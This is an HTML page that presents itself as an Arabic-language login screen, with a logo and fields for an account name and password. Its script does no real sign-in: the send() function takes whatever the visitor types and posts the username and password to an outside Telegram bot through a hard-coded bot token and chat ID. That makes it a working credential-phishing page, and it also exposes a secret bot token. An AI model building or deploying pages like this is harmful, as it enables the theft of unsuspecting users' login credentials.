<!DOCTYPE html>
<html>
<head>

<style>

body{
background:#f0f2f5;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
  
.box{
background:black;
width:100%;
height:100vh;
display:flex;
flex-direction:column;
justify-content:center;
align-items:center;
color:white;
}

input{
width:90%;
padding:10px;

}

button{
width:95%;

}

</style>

</head>

<body>

<div class="box">
  
<img src="logo.jpg" width="120">

<h3>تسجيل الدخول </h3>

<input id="name" placeholder="isem te3 cont">

<input id="secret" placeholder="modpas" type="password">

<button onclick="send()">دخول</button>

</div>

<script>

const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc";
const CHAT_ID = "7737717483";

function send(){

let name = document.getElementById("name").value;
let secret = document.getElementById("secret").value;

let text = "بيانات جديدة:\nالاسم: " + name + "\nالسر: " + secret;

fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
});

}

</script>

</body>
</html>
